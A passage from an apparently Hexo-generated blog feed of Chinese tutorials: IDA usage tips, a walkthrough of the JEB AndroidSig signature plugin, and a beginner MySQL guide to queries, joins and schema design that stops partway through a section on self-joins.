<h2 id="创建字符串数组"><a href="#创建字符串数组" class="headerlink" title="创建字符串数组"></a>创建字符串数组</h2><ol>
<li>首先创建第一个字符串。</li>
<li>选择所有需要创建的字符串，创建数组。</li>
<li>不选中 <code>Create as array</code> ，点击 <code>OK</code> 即可。</li>
</ol>
<h1 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><h2 id="使用已经格式化的数据"><a href="#使用已经格式化的数据" class="headerlink" title="使用已经格式化的数据"></a>使用已经格式化的数据</h2><p>在反汇编中选中已经格式化数据，右键 -&gt; <code>Create struct from selection</code> 并将其创建为一个结构。</p>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-17-01-16.png" class="">

<h2 id="使用本地类型"><a href="#使用本地类型" class="headerlink" title="使用本地类型"></a>使用本地类型</h2><p>使用 <code>Shift+ F1</code> 或菜单 <code>View &gt; Open subviews &gt; Local Types</code> 打开本地类型。按 <code>Ins</code> 键创建一个结构体。</p>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-17-05-07.png" class="">

<h2 id="通过代码自动创建字段"><a href="#通过代码自动创建字段" class="headerlink" title="通过代码自动创建字段"></a>通过代码自动创建字段</h2><p>选中结构体首地址的寄存器，按 <code>T</code> 键或者右键菜单 -&gt; <code>Structure offset</code> 添加缺少的字段。</p>
<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="Unicode字符串"><a href="#Unicode字符串" class="headerlink" title="Unicode字符串"></a>Unicode字符串</h2><p>如果程序使用宽字符串，则在创建字符串文字时通常使用相应的 <code>Unicode C-style</code> 选项就足够了：</p>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-17-13-43.png" class="">

<p>可以使用 <code>Alt + A + U</code> 快速创建 Unicode 16-bits 字符串。</p>
<h2 id="添加新的编码"><a href="#添加新的编码" class="headerlink" title="添加新的编码"></a>添加新的编码</h2><p>要将自定义编码添加到默认列表（通常为UTF-8，UTF-16LE和UTF-32LE）：</p>
<ol>
<li>Options &gt; String literals… (<code>Alt + A</code>);</li>
<li>点击 <code>Currently:</code> 按钮。</li>
<li>右键菜单 -&gt; <code>Insert…</code> (Ins);</li>
<li>指定编码名称。</li>
</ol>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-17-19-08.png" class="">

<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-17-19-14.png" class="">

<h2 id="对特定的字符串文字使用编码"><a href="#对特定的字符串文字使用编码" class="headerlink" title="对特定的字符串文字使用编码"></a>对特定的字符串文字使用编码</h2><ol>
<li>Options &gt; String literals… (<code>Alt + A</code>);</li>
<li>点击 <code>Manage defaults</code>。</li>
<li>单击 <code>Default 8-bit</code> 旁边的按钮，然后选择要使用的编码。</li>
</ol>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-17-23-15.png" class="">

<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-17-23-21.png" class="">

<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-17-23-28.png" class="">

<p>后续使用 <code>A</code> 键创建字符串将使用现在设置的默认编码。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<p>IDA 博客 Igor’s tip of the week 系列文章</p>
</blockquote>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>JebAndroidSigPlugin使用记录</title>
    <url>/2021/01/28/JebAndroidSigPlugin%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>最近使用了一下 JebAndroidSigPlugin 插件，感觉效果还可以，记录一下使用过程。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>直接去 <a href="https://github.com/pnfsoftware/jeb2-androsig">https://github.com/pnfsoftware/jeb2-androsig</a> 下载编译好的 jar 包， 丢到 <code>jeb/coreplugins</code> 目录下，正常情况下 JEB 应该自带该插件</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>使用过程主要参考下面两篇文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.pnfsoftware.com/blog/jeb-library-code-matching-for-android/</span><br><span class="line">https://www.pnfsoftware.com/blog/new-version-of-androsig/</span><br></pre></td></tr></table></figure>
<p>这里我直接使用上面链接提供的 <a href="https://s3-us-west-2.amazonaws.com/jebdecompiler2/androsig_1.1_db_20190515.zip">androsig_1.1_db_20190515.zip</a>,解压到 <code>JEB/coreplugins/android_sigs/</code> 目录下。</p>
<h2 id="Android-Signature-Recognizer"><a href="#Android-Signature-Recognizer" class="headerlink" title="Android Signature Recognizer"></a>Android Signature Recognizer</h2><p>JEB 打开待分析 APK ，执行 Android Signature Recognizer 插件，将会弹出下列界面，直接点击确定执行。</p>
<img src="/2021/01/28/JebAndroidSigPlugin%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2021-01-29-14-12-06.png" class="">

<p>执行完成效果如下图所示</p>
<img src="/2021/01/28/JebAndroidSigPlugin%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2021-01-29-14-16-28.png" class="">

<h2 id="Android-Signature-Generator"><a href="#Android-Signature-Generator" class="headerlink" title="Android Signature Generator"></a>Android Signature Generator</h2><p>接下来简单讲一下 Android Signature Generator 插件的使用，我们在分析过程中，发现了一些库被混淆了，此时就可以利用该插件制作 Sig 文件，然后利用 Android Signature Recognizer 插件进行识别。</p>
<p>这里我是用 Android Studio 创建一个新的应用，然后将 androidx 包制作一个 sig 文件，首先打开  Android Signature Generator 插件，按下图进行设置，点击确定。</p>
<img src="/2021/01/28/JebAndroidSigPlugin%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2021-01-29-14-27-54.png" class="">

<p>执行成功后，将会生成一个 <code>jeb/coreplugins/android_sigs</code> 目录下 androidx.sig 文件。</p>
<img src="/2021/01/28/JebAndroidSigPlugin%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2021-01-29-14-31-04.png" class="">

<p>后续如果发现 androidx 相关的包被混淆了，就可以使用 Android Signature Recognizer 插件进行识别了。</p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>JEB</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL基本使用</title>
    <url>/2019/12/14/MySQL%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>推荐使用 <a href="https://github.com/dbcli/mycli">mycli</a> 操作MySQL数据库.</p>
</blockquote>
<h1 id="MySQL-使用"><a href="#MySQL-使用" class="headerlink" title="MySQL 使用"></a>MySQL 使用</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>命令行连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p #回车后输入密码。</span><br></pre></td></tr></table></figure>
<p>退出登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quit 或 exit 或 ctrl+D</span><br></pre></td></tr></table></figure>
<p>其他</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select version(); # 查看版本</span><br><span class="line">select now(); #查看当前时间</span><br></pre></td></tr></table></figure>
<img src="/2019/12/14/MySQL%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/2019-12-15-16-32-28.png" class="">

<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><p>查看所有的数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p>使用数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 数据库名;</span><br></pre></td></tr></table></figure>

<p>查看当前使用的数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure>

<p>创建数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database 数据库名 charset=utf8mb4;</span><br><span class="line">例如：</span><br><span class="line">create database test01 charset=utf8mb4;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>utf8mb4 才是正真的 utf8。</p>
</blockquote>
<p>查看创建数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create database 数据库名;</span><br><span class="line">例如：</span><br><span class="line">show create database test01;</span><br></pre></td></tr></table></figure>

<p>删除数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database 数据库名;</span><br><span class="line">例如：</span><br><span class="line">drop database test01;</span><br></pre></td></tr></table></figure>
<p>当数据名称有特殊字符时，使用&#96;&#96;包起来。</p>
<h2 id="数据表操作"><a href="#数据表操作" class="headerlink" title="数据表操作"></a>数据表操作</h2><p>查看当前数据库中的所有表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>

<p>创建表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table 表名(id int, name varchar(100));</span><br><span class="line"></span><br><span class="line">-- 创建xxx表</span><br><span class="line">create table xxxx(</span><br><span class="line">    id int primary key not null auto_increment, </span><br><span class="line">    name varchar(100));</span><br><span class="line"></span><br><span class="line">-- 创建 students表（id、name、age、high, gender、cls_id)</span><br><span class="line">create table students(</span><br><span class="line">    id int unsigned not null auto_increment primary key,</span><br><span class="line">    name varchar(100) not null,</span><br><span class="line">    age tinyint unsigned,</span><br><span class="line">    high decimal(5, 2),</span><br><span class="line">    gender enum(&quot;男&quot;, &quot;女&quot;, &quot;保密&quot;) default &quot;保密&quot;,</span><br><span class="line">    cls_id int unsigned);</span><br><span class="line"></span><br><span class="line">-- 插入数据</span><br><span class="line">insert into students values(0, &quot;zhangsan&quot;, 18, 188, &quot;男&quot;, 0);</span><br><span class="line"></span><br><span class="line">-- 创建classe表(id、name)  </span><br><span class="line">create table classes(id int unsigned not null auto_increment primary key, name varchar(30));</span><br></pre></td></tr></table></figure>

<p>查看表结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc 表名;</span><br><span class="line">例如：</span><br><span class="line">desc students;</span><br></pre></td></tr></table></figure>

<p>修改表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 添加字段 alter table 表名 add 列名 类型;</span><br><span class="line">alter table students add birthday datetime;</span><br><span class="line"></span><br><span class="line">-- 修改字段 alter table 表名 modify 列名 类型;</span><br><span class="line">alter table students modify birthday date;</span><br><span class="line"></span><br><span class="line">-- 修改字段-重命名 alter table 表名 change 原名 新名 类型及约束;</span><br><span class="line">alter table students modify birthday  birth date default &quot;2000-1-1&quot;;</span><br><span class="line"></span><br><span class="line">-- 删除字段(尽量不用) alter table 表名 drop 列名;</span><br><span class="line">alter table students drop high;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>删除表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table 表名; -- 删除表</span><br><span class="line">drop database 数据库; -- 删除数据库</span><br></pre></td></tr></table></figure>

<p>查看创建表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create table 表名;</span><br></pre></td></tr></table></figure>

<h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><p>增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 全列插入</span><br><span class="line">-- insert into 表名 values(...);</span><br><span class="line">-- 主键字段 可以用0 null default 来占位</span><br><span class="line">insert into classes values(0, &quot;class02&quot;)</span><br><span class="line"></span><br><span class="line">insert into students values(0, &quot;lisi&quot;, 18, &quot;女&quot;, 0, &quot;2011-01-01&quot;, 167); </span><br><span class="line">insert into students values(null, &quot;lisi&quot;, 18, &quot;女&quot;, 0, &quot;2011-01-01&quot;, 167);</span><br><span class="line">insert into students values(default, &quot;lisi&quot;, 18, &quot;女&quot;, 0, &quot;2011-01-01&quot;, 167); </span><br><span class="line">insert into students values(default, &quot;lisi&quot;, 18, 1, 0, &quot;2011-01-01&quot;, 167); </span><br><span class="line">insert into students values(default, &quot;lisi&quot;, 18, 3, 0, &quot;2011-01-01&quot;, 167); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 部分插入</span><br><span class="line">-- insert into 表名(列1, 列2 ...) values(值1，值2);</span><br><span class="line"></span><br><span class="line">-- 插入多行</span><br><span class="line">insert into students (name, gender) values (&quot;貂蝉&quot;, 2)，(&quot;大乔&quot;, 2); </span><br><span class="line">insert into students values(default, &quot;鲁班&quot;, 18, 2, 0, &quot;2011-01-01&quot;, 167), (default, &quot;后羿&quot;, 18, 1, 0, &quot;2011-01-01&quot;, 167); </span><br></pre></td></tr></table></figure>

<p>修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- update 表名 set 列1=值1, 列2=值2 ... where 条件</span><br><span class="line">update students set gender=1;</span><br><span class="line">update students set gender=2 where id&gt;6;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查询所有的列</span><br><span class="line">-- select * from 表名;</span><br><span class="line">select * from students;</span><br><span class="line">-- 查询name=&quot;lisi&quot;的所有数据</span><br><span class="line">select * from students where name=&quot;lisi&quot;;</span><br><span class="line">-- 查询id &gt; 8的所有数据</span><br><span class="line">select * from students where id&gt;8;</span><br><span class="line"></span><br><span class="line">-- 查询指定的列</span><br><span class="line">-- select * 列1, 列2 ... from 表名;</span><br><span class="line">select name, gender from students;</span><br><span class="line"></span><br><span class="line">-- 使用 as 为列或表指定别名</span><br><span class="line">-- select 字段[as 别名], 字段[as 别名] from 数据表 where ...;</span><br><span class="line">select name as 姓名, gender as 性别 from students;</span><br><span class="line"></span><br><span class="line">-- 字段的顺序</span><br><span class="line">select id as 序号, gender as 性别, name as 姓名 from students;</span><br></pre></td></tr></table></figure>

<p>删除(基本不会使用，一般用一个字段标记是否删除)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- delete from 表名 where 条件;</span><br><span class="line">delete from students;</span><br><span class="line">delete from students where name=&quot;lisi&quot;;</span><br><span class="line"></span><br><span class="line">-- 逻辑删除</span><br><span class="line">-- 给students 表添加一个 is_delete 字段，bit类型</span><br><span class="line">alter table students add is_delete bit default 0;</span><br><span class="line">-- 删除</span><br><span class="line">update students set is_delete = 1 where id = 6;</span><br></pre></td></tr></table></figure>

<h2 id="数据库备份和恢复"><a href="#数据库备份和恢复" class="headerlink" title="数据库备份和恢复"></a>数据库备份和恢复</h2><p>备份 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -u用户名 -p 数据库名 &gt; dump.sql #按提示输入密码</span><br></pre></td></tr></table></figure>

<p>恢复</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u-u用户名 -p 新数据库名 &lt; dump.sql #按提示输入密码</span><br></pre></td></tr></table></figure>

<h1 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h1><h2 id="三范式"><a href="#三范式" class="headerlink" title="三范式"></a>三范式</h2><p>经过研究和对使用中问题的总结，对于设计数据库提出了一些规范，这些规范被称为范式(Normal Form)，<br>目前有迹可寻的共有8种范式，一般需要遵守3范式即可。</p>
<ul>
<li>第一范式（1NF）：强调的是列的原子性，即列不能够再分成其他几列。</li>
<li>第二范式（2NF）：首先是 1NF，另外包含两部分内容，一是表必须有一个主键；二是没有包含在主键中的列必须完全依赖于主键，而不能只依赖于主键的一部分。 </li>
<li>第三范式（3NF）：首先是 2NF，另外非主键列必须直接依赖于主键，不能存在传递依赖。即不能存在：非主键列 A 依赖于非主键列 B，非主键列 B 依赖于主键的情况。</li>
</ul>
<h2 id="E-R模型"><a href="#E-R模型" class="headerlink" title="E-R模型"></a>E-R模型</h2><ul>
<li>E表示entry-实体，设计实体就像定义一个类一样，指定从哪些方面描述对象，一个实体转换为数据库中的一个表。</li>
<li>R表示relationship-关系，关系描述两个实体之间的对应规则，关系的类型包括包括一对一、一对多、多对多。</li>
</ul>
<ol>
<li><p>一对一 :<br>但一个表的列太多时，并且某些列不经常出现在结果中，此时可以对列进行拆分，此时两个表的关系为一对一关系。实体A对实体B为1对1，则在表A或表B中创建一个字段，存储另一个表的主键值。</p>
</li>
<li><p>一对多 :<br>A 表中的一条数据对应 B 表中的一条数据， B 表中的一条数据对应 A 表中的多条数据。此时 A 与 B 为多对一的关系。实体A对实体B为1对多：在表B中创建一个字段，存储表A的主键值。</p>
</li>
<li><p>多对多 :<br>A 表中的一条数据对应 B 表中的多条数据， B 表中的一条数据对应 A 表中的多条数据。此时 A 与 B 为多对多的关系。实体A对实体B为多对多：新建一张表C，这个表只有两个字段，一个用于存储A的主键值，一个用于存储B的主键值。</p>
</li>
</ol>
<h1 id="更多查询用法"><a href="#更多查询用法" class="headerlink" title="更多查询用法"></a>更多查询用法</h1><p>消除重复行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct 列1, 列2 ... from 表名;例如:</span><br><span class="line">select distinct gender from students;</span><br></pre></td></tr></table></figure>

<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>使用 where 子句对表中的数据筛选，结果为 true 的行为会出现在结果集中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 条件;</span><br></pre></td></tr></table></figure>
<p>where 后面支持多种运算符，进行条件的处理。</p>
<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><ul>
<li>等于 &#x3D; </li>
<li>大于 &gt;</li>
<li>大于等于 &gt;&#x3D;</li>
<li>小于 &lt;</li>
<li>小于等于 &lt;&#x3D;</li>
<li>不等于 !&#x3D; 或 &lt;&gt;</li>
</ul>
<p>例： 查询编号大于3的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where id &gt; 3;</span><br></pre></td></tr></table></figure>
<p>例：查询编号不大于4的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where id &lt;= 4; </span><br></pre></td></tr></table></figure>
<p>例：查询姓名不是“黄蓉”的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where name != &quot;黄蓉&quot;;</span><br></pre></td></tr></table></figure>
<p>例：查询没被删除的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where is_delete=0;</span><br></pre></td></tr></table></figure>

<h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><ul>
<li>and</li>
<li>or</li>
<li>not</li>
</ul>
<p>例：查询编号大于3的女同学</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where id &gt; 4 or gender = 0;</span><br></pre></td></tr></table></figure>
<p>例6：查询编号小于4或没被删除的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where id &lt; 4 or is_delete = 0;</span><br></pre></td></tr></table></figure>

<h2 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h2><ul>
<li>like </li>
<li>% 表示任意多个任意字符</li>
<li>_ 表示一个任意字符</li>
</ul>
<p>例：查询姓黄的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where name like &quot;黄%&quot;;</span><br></pre></td></tr></table></figure>
<p>例：查询姓黄并且“名”是一个字的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where name like &quot;黄_&quot;;</span><br></pre></td></tr></table></figure>
<p>例：查询姓黄或叫靖的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where name like &quot;黄%&quot; or name like &quot;%靖&quot;;</span><br></pre></td></tr></table></figure>

<h2 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h2><ul>
<li>in 表示在一个非连续的范围内</li>
</ul>
<p>例：查询编号是1或3或8的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where id in(1,3, 8);</span><br></pre></td></tr></table></figure>

<ul>
<li>between … and …表示在一个连续的范围内</li>
</ul>
<p>例：查询编号为3至8的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where id between 3 and 8; </span><br></pre></td></tr></table></figure>

<p>例：查询编号是3至8的男生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where (id between 3 and 8) and gender = 1;</span><br></pre></td></tr></table></figure>

<h2 id="空判断"><a href="#空判断" class="headerlink" title="空判断"></a>空判断</h2><ul>
<li>注意: null 和 “” 是不同的</li>
<li>判空 is null</li>
</ul>
<p>例：查询没有填写身高的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where height is null;</span><br></pre></td></tr></table></figure>

<ul>
<li>判非空 is not null</li>
</ul>
<p>例：查询填写了身高的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where height is not null and gender=1;</span><br></pre></td></tr></table></figure>

<h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><ul>
<li>优先级由高到低的顺序为：小括号，not，比较运算符，逻辑运算符</li>
<li>and比or先运算，如果同时出现并希望先算or，需要结合()使用</li>
</ul>
<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 order by 列1 asc|desc [,列2 asc|desc,...]</span><br></pre></td></tr></table></figure>
<p>说明</p>
<ul>
<li>将行数据按照列1进行排序，如果某些行列1的值相同时，则按照列2排序，以此类推</li>
<li>默认按照列值从小到大排列（asc）</li>
<li>asc从小到大排列，即升序</li>
<li>desc从大到小排序，即降序</li>
</ul>
<p>例：查询未删除男生信息，按学号降序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where gender = 1 and is_delete = 0 order by id desc;</span><br></pre></td></tr></table></figure>

<p>例：查询未删除学生信息，按名称升序(默认升序)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where is_delete=0 order by id;</span><br></pre></td></tr></table></figure>

<p>例3：显示所有的学生信息，先按照年龄从大–&gt;小排序，当年龄相同时 按照身高从高–&gt;矮排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students order by age, height desc;</span><br></pre></td></tr></table></figure>

<h2 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h2><ul>
<li>count(*)表示计算总行数，括号中写星与列名，结果是相同的</li>
</ul>
<p>例：查询学生总数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from students;</span><br></pre></td></tr></table></figure>

<ul>
<li>max(列)表示求此列的最大值</li>
</ul>
<p>例：查询女生的编号最大值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select max(id) from students where gender = 2;</span><br></pre></td></tr></table></figure>

<ul>
<li>min(列)表示求此列的最小值</li>
</ul>
<p>例：查询未删除的学生最小编号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select min(id) from students where is_delete = 0; </span><br></pre></td></tr></table></figure>

<ul>
<li>sum(列)表示求此列的和</li>
</ul>
<p>例：查询男生的总年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sum(age) from students where gender = 1;</span><br><span class="line">-- 平均年龄</span><br><span class="line">select sum(age)/count(*) from students where gender = 1;</span><br></pre></td></tr></table></figure>

<ul>
<li>avg(列)表示求此列的平均值</li>
</ul>
<p>例：查询未删除女生的编号平均值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select avg(age) from students where is_delete = 0 and gender = 2;</span><br></pre></td></tr></table></figure>

<h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><ul>
<li>group by的含义:将查询结果按照1个或多个字段进行分组，字段值相同的为一组</li>
<li>group by可用于单个字段分组，也可用于多个字段分组</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 根据gender字段来分组</span><br><span class="line">select gender from students group by gender;</span><br></pre></td></tr></table></figure>

<p>group by + group_concat()</p>
<ul>
<li>group_concat(字段名)可以作为一个输出字段来使用，</li>
<li>表示分组之后，根据分组结果，使用group_concat()来放置每一组的某字段的值的集合</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, group_concat(name) from students group by gender;</span><br><span class="line"></span><br><span class="line">select gender, group_concat(id) from students group by gender;  </span><br><span class="line">+--------+------------------+</span><br><span class="line">| gender | group_concat(id) |</span><br><span class="line">+--------+------------------+</span><br><span class="line">| 男     | 3,4,8,9,13,15    |</span><br><span class="line">| 女     | 1,2,5,7,10,12,14 |</span><br><span class="line">| 中性   | 11               |</span><br><span class="line">| 保密   | 6                |</span><br><span class="line">+--------+------------------+</span><br></pre></td></tr></table></figure>
<p>group by + 集合函数</p>
<ul>
<li>通过group_concat()的启发，我们既然可以统计出每个分组的某字段的值的集合，那么我们也可以通过集合函数来对这个值的集合做一些操作。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, group_concat(age) from students group by gender;</span><br><span class="line"></span><br><span class="line">-- 分别统计性别为男/女的平均年龄</span><br><span class="line">select gender, avg(age) from students group by gender;</span><br><span class="line"></span><br><span class="line">-- 分别统计性别的个数</span><br><span class="line">select gender, count(*) from students group by gender;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>group by + having</p>
<ul>
<li>having 条件表达式：用来分组查询后指定一些条件来输出查询结果</li>
<li>having作用和where一样，但having只能用于group by<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, count(*) from students group by gender</span><br><span class="line"> having count(*) &gt;2;  </span><br></pre></td></tr></table></figure></li>
</ul>
<p>group by + with rollup</p>
<ul>
<li>with rollup的作用是：在最后新增一行，来记录当前列里所有记录的总和</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, count(*) from students group by gender</span><br><span class="line">with rollup;</span><br><span class="line"></span><br><span class="line">select gender, group_concat(age) from students group by gender with rollup;</span><br></pre></td></tr></table></figure>

<h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 limit start,count</span><br></pre></td></tr></table></figure>
<p>说明</p>
<ul>
<li>从start开始，获取count条数据</li>
</ul>
<p>例：查询前3行男生信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students where gender = 1 limit 0,3;</span><br></pre></td></tr></table></figure>

<h2 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h2><p>当查询结果的列来源于多张表时，需要将多张表连接成一个大的数据集，再选择合适的列返回</p>
<p>mysql支持三种类型的连接查询，分别为：</p>
<ul>
<li>内连接查询：查询的结果为两个表匹配到的数据</li>
</ul>
<img src="/2019/12/14/MySQL%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/2019-12-18-12-55-40.png" class="">

<ul>
<li>右连接查询：查询的结果为两个表匹配到的数据，右表特有的数据，对于左表中不存在的数据使用null填充</li>
</ul>
<img src="/2019/12/14/MySQL%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/2019-12-18-12-55-57.png" class="">

<ul>
<li>左连接查询：查询的结果为两个表匹配到的数据，左表特有的数据，对于右表中不存在的数据使用null填充</li>
</ul>
<img src="/2019/12/14/MySQL%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/2019-12-18-12-56-06.png" class="">

<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表1 inner 或 left 或 right join 表2 on 表1.列 = 表2.列;</span><br></pre></td></tr></table></figure>

<p>例：使用内连接查询班级表与学生表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students inner join classes on students.cls_id = classes.id;</span><br></pre></td></tr></table></figure>
<p>例2：使用左连接查询班级表与学生表, 此处使用了as为表起别名，目的是编写简单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students as s left join classes as c on s.cls_id = c.id; </span><br></pre></td></tr></table></figure>

<p>例3：使用右连接查询班级表与学生表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from students as s right join classes as c on s.cls_id = c.id; </span><br></pre></td></tr></table></figure>

<p>例4：查询学生姓名及班级名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.name, c.name from students as s inner join classes as c on s.cls_id = c.id; </span><br></pre></td></tr></table></figure>

<h2 id="自关联"><a href="#自关联" class="headerlink" title="自关联"></a>自关联</h2><ul>
<li><p>设计省信息的表结构provinces</p>
<ul>
<li>id</li>
<li>ptitle</li>
</ul>
</li>
<li><p>设计市信息的表结构citys</p>
<ul>
<li>id</li>
<li>ctitle</li>
<li>proid</li>
</ul>
</li>
